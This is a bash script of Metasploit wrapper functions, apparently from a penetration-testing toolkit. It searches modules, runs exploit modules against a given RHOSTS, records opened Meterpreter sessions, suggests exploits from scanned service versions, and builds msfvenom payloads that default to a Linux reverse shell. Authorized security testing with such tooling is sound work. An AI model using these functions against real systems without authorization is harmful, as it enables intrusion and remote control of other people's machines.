#!/bin/bash
# Metasploit wrapper functions

msf_find_binary() {
    local name="$1"
    local configured path

    case "$name" in
        msfconsole) configured="${msf_msfconsole_path:-}" ;;
        msfvenom) configured="${msf_msfvenom_path:-}" ;;
        *) configured="" ;;
    esac

    if [ -n "$configured" ] && [ -x "$configured" ]; then
        echo "$configured"
        return 0
    fi

    if command -v "$name" &>/dev/null; then
        command -v "$name"
        return 0
    fi

    for path in "/opt/metasploit-framework/bin/$name" "/usr/bin/$name" "/usr/local/bin/$name"; do
        if [ -x "$path" ]; then
            echo "$path"
            return 0
        fi
    done

    return 1
}

msf_doctor() {
    echo -e "${MAGENTA}Metasploit Status${NC}"
    echo ""

    local msfconsole msfvenom
    if msfconsole=$(msf_find_binary msfconsole); then
        success "msfconsole: $msfconsole"
    else
        error "msfconsole: not found"
    fi

    if msfvenom=$(msf_find_binary msfvenom); then
        success "msfvenom: $msfvenom"
    else
        error "msfvenom: not found"
    fi

    if [ -n "$msfconsole" ]; then
        local version
        version=$("$msfconsole" --version 2>/dev/null | head -1 || echo "unknown")
        info "Version: $version"
    fi
}

msf_search() {
    local query="$*"
    [ -n "$query" ] || { error "Search query required"; return 1; }

    local msfconsole
    msfconsole=$(msf_find_binary msfconsole) || { error "msfconsole not found"; return 1; }

    "$msfconsole" -q -x "search $query; exit" 2>/dev/null
}

msf_search_cve() {
    local cve_id="$1"
    [ -n "$cve_id" ] || { error "CVE ID required"; return 1; }
    msf_search "cve:$cve_id"
}

msf_info() {
    local module="$1"
    [ -n "$module" ] || { error "Module path required"; return 1; }

    local msfconsole
    msfconsole=$(msf_find_binary msfconsole) || { error "msfconsole not found"; return 1; }

    "$msfconsole" -q -x "info $module; exit" 2>/dev/null
}

msf_run_module() {
    local module="$1"
    shift
    [ -n "$module" ] || { error "Module path required"; return 1; }

    local msfconsole
    msfconsole=$(msf_find_binary msfconsole) || { error "msfconsole not found"; return 1; }

    local rc_file
    rc_file=$(mktemp "${TEMP_DIR}/msf_XXXXXX.rc")
    {
        echo "use $module"
        while [ "$#" -gt 0 ]; do
            case "$1" in
                --rhost)
                    shift
                    echo "set RHOSTS ${1:-}"
                    ;;
                --lhost)
                    shift
                    echo "set LHOST ${1:-}"
                    ;;
                --lport)
                    shift
                    echo "set LPORT ${1:-}"
                    ;;
                --rport)
                    shift
                    echo "set RPORT ${1:-}"
                    ;;
                --payload)
                    shift
                    echo "set PAYLOAD ${1:-}"
                    ;;
                --*) ;;
                *)
                    if [ -n "${2:-}" ]; then
                        echo "set $(echo "$1" | tr '[:lower:]' '[:upper:]') $2"
                        shift
                    fi
                    ;;
            esac
            shift || true
        done
        echo "run"
        echo "exit -y"
    } > "$rc_file"

    log "Running module: $module"
    local output
    output=$("$msfconsole" -q -r "$rc_file" 2>&1) || true
    echo "$output"

    if echo "$output" | grep -q "Meterpreter session"; then
        local session_id
        session_id=$(echo "$output" | grep -oP 'Meterpreter session \K[0-9]+' | tail -1 || echo "")
        if [ -n "$session_id" ]; then
            add_msf_session "${2:-unknown}" "$module" "$session_id" "open"
            success "Session opened: $session_id"
        fi
    fi

    rm -f "$rc_file"
}

msf_generate_payload() {
    local payload="${1:-linux/x64/shell_reverse_tcp}"
    shift
    local lhost="${msf_default_lhost:-127.0.0.1}"
    local lport="${msf_default_lport:-4444}"
    local format="elf"
    local output_file="$TEMP_DIR/payload_$(date +%s)"

    while [ "$#" -gt 0 ]; do
        case "$1" in
            --lhost) shift; lhost="$1" ;;
            --lport) shift; lport="$1" ;;
            --format) shift; format="$1" ;;
            --output) shift; output_file="$1" ;;
        esac
        shift || true
    done

    local msfvenom
    msfvenom=$(msf_find_binary msfvenom) || { error "msfvenom not found"; return 1; }

    "$msfvenom" -p "$payload" "LHOST=$lhost" "LPORT=$lport" -f "$format" -o "$output_file" 2>/dev/null
    success "Payload written: $output_file"
    echo "$output_file"
}

msf_list_sessions() {
    sqlite3 -header -column "$DATABASE" \
        "SELECT id, target, module, session_id, status, opened_at FROM msf_sessions WHERE status='open' ORDER BY opened_at DESC;" 2>/dev/null
}

msf_suggest_from_target() {
    local target="$1"
    local suggest_file="$REPORTS_DIR/target/$(sanitize_filename "$target")"/*/exploit_suggestions.json

    local file
    for file in $REPORTS_DIR/target/*_"$(sanitize_filename "$target")"/exploit_suggestions.json \
                $REPORTS_DIR/target/"$(sanitize_filename "$target")"_*/exploit_suggestions.json; do
        [ -f "$file" ] || continue
        info "Exploit suggestions from: $file"
        cat "$file"
        return 0
    done

    local latest
    latest=$(find "$REPORTS_DIR/target" -name "exploit_suggestions.json" -newer "$REPORTS_DIR" 2>/dev/null | head -1)
    if [ -n "$latest" ] && [ -f "$latest" ]; then
        cat "$latest"
        return 0
    fi

    warn "No exploit suggestions found for $target. Run: recon target $target --exploit"
    return 1
}

msf_build_suggestions() {
    local target="$1" services_file="$2" output_file="$3"
    [ -f "$services_file" ] || return 0

    local suggestions="["
    local first=true

    while IFS= read -r line; do
        [ -n "$line" ] || continue
        local service version search_query
        service=$(echo "$line" | awk '{print $3}')
        version=$(echo "$line" | awk '{print $4}')
        search_query="${service} ${version}"
        [ -n "$search_query" ] || continue

        local msf_results=""
        if msfconsole=$(msf_find_binary msfconsole 2>/dev/null); then
            msf_results=$("$msfconsole" -q -x "search $search_query; exit" 2>/dev/null | grep -E 'exploit/' | head -5 || true)
        fi

        local searchsploit_results=""
        if command -v searchsploit &>/dev/null; then
            searchsploit_results=$(searchsploit "$search_query" 2>/dev/null | head -10 || true)
        fi

        if [ "$first" = true ]; then first=false; else suggestions+=","; fi
        suggestions+=$(printf '{"service":"%s","version":"%s","msf_modules":"%s","searchsploit":"%s"}' \
            "$(json_escape "$service")" "$(json_escape "$version")" \
            "$(json_escape "$msf_results")" "$(json_escape "$searchsploit_results")")
    done < "$services_file"

    suggestions+="]"
    printf "%s\n" "$suggestions" > "$output_file"
}
